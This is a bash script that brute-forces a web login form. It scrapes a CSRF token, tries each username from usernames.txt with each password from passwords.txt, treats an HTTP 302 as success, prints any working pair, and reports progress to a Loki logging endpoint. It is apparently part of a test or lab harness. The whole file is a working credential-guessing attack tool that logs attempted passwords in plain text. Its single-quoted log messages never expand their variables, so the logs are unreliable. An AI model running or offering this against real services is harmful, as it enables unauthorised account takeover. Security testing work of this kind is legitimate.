#!/bin/bash

test-credentials() {
    local username="$1"
    local password="$2"
    local host="$3"

    #get token
    curl -c cookies.txt -s "${host}/login" -o login.html
    CSRF_TOKEN=$(grep 'csrf_token' login.html | awk -F"value='" '{print $2}' | awk -F"'" '{print $1}')


    HTTP_CODE=$(curl -b cookies.txt -s -o /dev/null -w "%{http_code}\n" "${host}/login" \
      -X POST \
      -H "Origin: ${host}" \
      -H "Referer: ${host}/login" \
      --data-raw "username=${username}&csrf_token=${CSRF_TOKEN}&password=${password}")

    if [ "${HTTP_CODE}" -eq 302 ]; then
        echo "${username}:${password}"
    fi
}

# ------------- MAIN ------------- #
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <host> <loki-endpoint>"
    exit 1
fi  





HOST="$1"
export SMOLOKI_BASE_ENDPOINT="$2"
TIMEOUT_SECONDS=7
SLEEP_INTERVAL=2
elapsed=0
while [[ "$(curl -s -o /dev/null -w "%{http_code}" "${HOST}")" == "000" ]]; do
  if (( elapsed >= TIMEOUT_SECONDS )); then
    smoloki '{"job":"test","level":"info", "host":"${HOST}"}' '{"message":"Timeout reached (${TIMEOUT_SECONDS}s). Service is not available."}'
    exit 1
  fi

  smoloki '{"job":"test","level":"info", "host":"${HOST}"}' '{"message":"Waiting for the service to become available... (${elapsed}s)"}'
  sleep "${SLEEP_INTERVAL}"
  ((elapsed+=SLEEP_INTERVAL))
done

while IFS= read -r USERNAME || [[ -n "$USERNAME" ]]; do
    while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
        smoloki '{"job":"test","level":"info", "host":"${HOST}"}' '{"message":"testing ${USERNAME}:${PASSWORD} on ${HOST}"}'
        RESULT=$(test-credentials "${USERNAME}" "${PASSWORD}" "${HOST}")
        if [[ -n "$RESULT" ]]; then
            smoloki '{"job":"test","level":"info", "host":"${HOST}"}' '{"message":"+ RESULT: ${RESULT} on ${HOST} found in ${SECONDS}s"}'
            exit 0
        fi
    done < passwords.txt
done < usernames.txt
smoloki '{"job":"test","level":"info", "host":"${HOST}"}' '{"message":"+ \"RESULT: No match was found. Searched took ${SECONDS}s\"\n"}'
exit 0
